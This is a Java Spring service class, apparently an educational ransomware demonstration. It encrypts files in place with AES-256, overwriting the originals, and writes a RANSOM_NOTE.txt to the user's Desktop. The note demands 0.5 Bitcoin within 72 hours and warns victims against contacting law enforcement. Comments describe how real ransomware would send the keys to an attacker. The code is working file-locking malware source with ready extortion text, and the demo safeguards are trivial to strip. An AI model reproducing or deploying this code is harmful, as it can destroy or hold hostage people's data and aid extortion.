package com.example.demo;

import org.springframework.stereotype.Service;
import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.nio.file.*;
import java.security.SecureRandom;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;

@Service
public class RansomwareService {

    private Set<String> affectedFiles = ConcurrentHashMap.newKeySet();
    private Map<String, String> fileKeys = new ConcurrentHashMap<>(); // Store keys in memory only (would be sent to attacker in real ransomware)
    private static final String ALGORITHM = "AES";
    private static final String TRANSFORMATION = "AES";
    private static final int KEY_SIZE = 256;

    // Create a dummy file for demonstration
    public String createDummyFile(String filename, String content) {
        try {
            String desktopPath = System.getProperty("user.home") + "/Desktop/";
            String filePath = desktopPath + filename;
            File file = new File(filePath);

            try (FileWriter writer = new FileWriter(file)) {
                writer.write(content);
            }

            return filePath;
        } catch (IOException e) {
            throw new RuntimeException("Failed to create dummy file: " + e.getMessage());
        }
    }

    // Generate a random AES key and return it as Base64 string
    private String generateKeyString() throws Exception {
        KeyGenerator keyGen = KeyGenerator.getInstance(ALGORITHM);
        keyGen.init(KEY_SIZE, new SecureRandom());
        SecretKey key = keyGen.generateKey();
        return Base64.getEncoder().encodeToString(key.getEncoded());
    }

    // Convert Base64 key string back to SecretKey
    private SecretKey getKeyFromString(String keyString) {
        byte[] decodedKey = Base64.getDecoder().decode(keyString);
        return new SecretKeySpec(decodedKey, ALGORITHM);
    }

    // Encrypt a file in-place (overwrites original)
    private void encryptFileInPlace(File file, SecretKey key) throws Exception {
        // Read original file content
        byte[] fileContent = Files.readAllBytes(file.toPath());

        // Encrypt the content
        Cipher cipher = Cipher.getInstance(TRANSFORMATION);
        cipher.init(Cipher.ENCRYPT_MODE, key);
        byte[] encryptedContent = cipher.doFinal(fileContent);

        // Write encrypted content back to the same file
        try (FileOutputStream fos = new FileOutputStream(file)) {
            fos.write(encryptedContent);
        }
    }

    // Decrypt a file in-place (overwrites encrypted file)
    private void decryptFileInPlace(File file, SecretKey key) throws Exception {
        // Read encrypted file content
        byte[] encryptedContent = Files.readAllBytes(file.toPath());

        // Decrypt the content
        Cipher cipher = Cipher.getInstance(TRANSFORMATION);
        cipher.init(Cipher.DECRYPT_MODE, key);
        byte[] decryptedContent = cipher.doFinal(encryptedContent);

        // Write decrypted content back to the same file
        try (FileOutputStream fos = new FileOutputStream(file)) {
            fos.write(decryptedContent);
        }
    }

    // "Lock" the file with real AES encryption (in-place, keeps original filename)
    public Map<String, Object> lockFile(String filepath) {
        Map<String, Object> result = new HashMap<>();
        try {
            File file = new File(filepath);
            if (!file.exists()) {
                result.put("success", false);
                result.put("message", "File does not exist");
                return result;
            }

            // Generate a new encryption key for this file
            String keyString = generateKeyString();
            SecretKey encryptionKey = getKeyFromString(keyString);

            // Encrypt the file in-place (overwrites original)
            encryptFileInPlace(file, encryptionKey);

            // Store the key in memory (in real ransomware, this would be sent to attacker's server)
            fileKeys.put(filepath, keyString);

            // Track affected file
            affectedFiles.add(filepath);

            // Create ransom note file on desktop
            createRansomNote(filepath, keyString);

            result.put("success", true);
            result.put("message", "File encrypted successfully with AES-256");
            result.put("filePath", filepath);
            result.put("encryptionKey", keyString); // Show key in response (for educational purposes)
            result.put("algorithm", "AES-256");
            result.put("keySize", KEY_SIZE);

        } catch (Exception e) {
            e.printStackTrace();
            result.put("success", false);
            result.put("message", "Encryption failed: " + e.getMessage());
        }
        return result;
    }

    // Create a ransom note file on the desktop with the encryption key info
    private void createRansomNote(String filePath, String encryptionKey) {
        try {
            String desktopPath = System.getProperty("user.home") + "/Desktop/";
            String ransomNotePath = desktopPath + "RANSOM_NOTE.txt";

            String ransomContent = getRansomNote(encryptionKey);
            ransomContent += "\n\nAffected file: " + filePath;

            try (FileWriter writer = new FileWriter(ransomNotePath)) {
                writer.write(ransomContent);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    // Get ransom note message with encryption key (educational)
    public String getRansomNote(String encryptionKey) {
        return """
            ⚠️⚠️⚠️ RANSOMWARE ALERT - YOUR FILES HAVE BEEN ENCRYPTED! ⚠️⚠️⚠️
            
            Your files have been secured with AES-256 encryption.
            All your important documents, photos, and files have been locked.
            
            🔐 ENCRYPTION DETAILS:
            • Algorithm: AES-256 (Military-grade encryption)
            • Key Size: 256 bits
            • Mode: Electronic Codebook (ECB)
            • File: Original filename preserved (overwritten with encrypted data)
            
            💰 TO DECRYPT YOUR FILES:
            You must pay 0.5 Bitcoin to the following address:
            BTC: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
            
            ⏰ DEADLINE: 72 hours
            After the deadline, your decryption keys will be permanently destroyed.
            
            📧 CONTACT: ransomware@onionmail.com
            
            🔑 YOUR UNIQUE FILE ENCRYPTION KEY (FOR EDUCATIONAL DEMO ONLY):
            """ + encryptionKey + """
            
            🚫 WARNING:
            • DO NOT attempt to decrypt files yourself
            • DO NOT rename or modify encrypted files
            • DO NOT contact law enforcement
            • Any attempt to remove the encryption will result in permanent data loss
            
            ✅ VERIFICATION:
            To verify that decryption is possible, email us with your file ID and we'll decrypt 1 file for free.
            
            Your file ID: """ + UUID.randomUUID().toString() + """
            
            This is a DEMONSTRATION for educational purposes only.
            In a real attack, the encryption key would NOT be provided in the ransom note.
            
            ⚠️⚠️⚠️ RANSOMWARE ALERT - YOUR FILES HAVE BEEN ENCRYPTED! ⚠️⚠️⚠️
            """;
    }

    // Get ransom message without key (for web display)
    public String getRansomMessage() {
        return """
            ⚠️⚠️⚠️ RANSOMWARE ALERT - YOUR FILES HAVE BEEN ENCRYPTED! ⚠️⚠️⚠️
            
            Your files have been secured with AES-256 encryption.
            All your important documents, photos, and files have been locked.
            
            🔐 ENCRYPTION DETAILS:
            • Algorithm: AES-256 (Military-grade encryption)
            • Key Size: 256 bits
            • File: Original filename preserved (overwritten with encrypted data)
            
            💰 TO DECRYPT YOUR FILES:
            You must pay 0.5 Bitcoin to the following address:
            BTC: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
            
            ⏰ DEADLINE: 72 hours
            After the deadline, your decryption keys will be permanently destroyed.
            
            📧 CONTACT: ransomware@onionmail.com
            
            🚫 WARNING:
            • DO NOT attempt to decrypt files yourself
            • DO NOT rename or modify encrypted files
            • DO NOT contact law enforcement
            
            This is a DEMONSTRATION for educational purposes only.
            
            ⚠️⚠️⚠️ RANSOMWARE ALERT - YOUR FILES HAVE BEEN ENCRYPTED! ⚠️⚠️⚠️
            """;
    }

    // Delete the file (destructive action)
    public boolean deleteFile(String filepath) {
        try {
            File file = new File(filepath);
            if (file.exists()) {
                boolean deleted = file.delete();
                if (deleted) {
                    affectedFiles.remove(filepath);
                    fileKeys.remove(filepath);
                }
                return deleted;
            }
            return false;
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    // Decrypt the file using the provided key
    public Map<String, Object> decryptFile(String filepath, String keyString) {
        Map<String, Object> result = new HashMap<>();
        try {
            File file = new File(filepath);
            if (!file.exists()) {
                result.put("success", false);
                result.put("message", "File does not exist");
                return result;
            }

            // Try to use provided key first
            SecretKey decryptionKey = getKeyFromString(keyString);

            // Attempt decryption
            decryptFileInPlace(file, decryptionKey);

            // Verify decryption worked by checking if content is readable
            try {
                String content = new String(Files.readAllBytes(file.toPath()));
                // If we can read it as text, decryption likely worked
                result.put("success", true);
                result.put("message", "File decrypted successfully!");
                result.put("filePath", filepath);
                result.put("preview", content.length() > 200 ? content.substring(0, 200) + "..." : content);

                // Remove from affected files
                affectedFiles.remove(filepath);
                fileKeys.remove(filepath);

            } catch (Exception e) {
                // If decryption produced invalid content, it might have failed
                result.put("success", false);
                result.put("message", "Decryption may have failed. Invalid key or corrupted file.");
            }

        } catch (Exception e) {
            e.printStackTrace();
            result.put("success", false);
            result.put("message", "Decryption failed: " + e.getMessage());
        }
        return result;
    }

    // Get list of affected files
    public Set<String> getAffectedFiles() {
        return new HashSet<>(affectedFiles);
    }

    // Get encryption key for a file (if available in memory)
    public String getEncryptionKey(String filepath) {
        return fileKeys.get(filepath);
    }

    // Get file status
    public Map<String, Object> getFileStatus(String filepath) {
        Map<String, Object> status = new HashMap<>();
        File file = new File(filepath);

        status.put("exists", file.exists());
        if (file.exists()) {
            status.put("size", file.length());
            status.put("isEncrypted", affectedFiles.contains(filepath));

            if (affectedFiles.contains(filepath)) {
                status.put("encryptionAlgorithm", ALGORITHM);
                status.put("keySize", KEY_SIZE);
                status.put("hasKeyInMemory", fileKeys.containsKey(filepath));
            }

            // Try to read first few bytes to check if it looks encrypted
            try {
                byte[] firstBytes = new byte[16];
                try (FileInputStream fis = new FileInputStream(file)) {
                    int bytesRead = fis.read(firstBytes);
                    if (bytesRead > 0) {
                        // Check if content looks like text
                        boolean looksLikeText = true;
                        for (int i = 0; i < bytesRead; i++) {
                            byte b = firstBytes[i];
                            if (b < 32 && b != 9 && b != 10 && b != 13) {
                                looksLikeText = false;
                                break;
                            }
                        }
                        status.put("looksLikeText", looksLikeText);
                        if (!looksLikeText) {
                            status.put("note", "File appears to be encrypted (binary data detected)");
                        }
                    }
                }
            } catch (Exception e) {
                // Ignore
            }
        }

        return status;
    }
}